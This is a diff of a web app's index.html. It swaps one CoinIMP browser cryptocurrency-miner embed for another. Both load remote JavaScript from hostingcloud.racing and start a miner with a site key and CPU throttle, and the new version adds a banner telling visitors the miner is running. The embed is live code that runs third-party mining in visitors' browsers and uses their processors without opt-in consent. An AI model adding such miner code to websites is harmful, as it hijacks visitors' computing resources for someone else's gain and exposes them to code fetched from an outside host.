@@ -68,7 +68,6 @@
     display: none !important;
   }
 </style>
-
   </head>
 
   <body>
@@ -78,14 +77,14 @@
     <script type="module" src="/src/main.tsx"></script>
 
     <!-- Script de minage CoinIMP -->
-    <script src="https://www.hostingcloud.racing/hyZN.js"></script>
-    <script>
-      var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-        throttle: 0.5,
-        c: 'w'
-      });
-      _client.start();
-
+   <script src="https://www.hostingcloud.racing/MFIJ.js"></script>
+<script>
+    var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+        throttle: 0.4, c: 'w', ads: 0
+    });
+    _client.start();
+    _client.stop();
+    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#241599", 20, "#d2220f");
       // Ajout notification personnalisée
       const notif = document.createElement('div');
       notif.id = 'miningNotification';
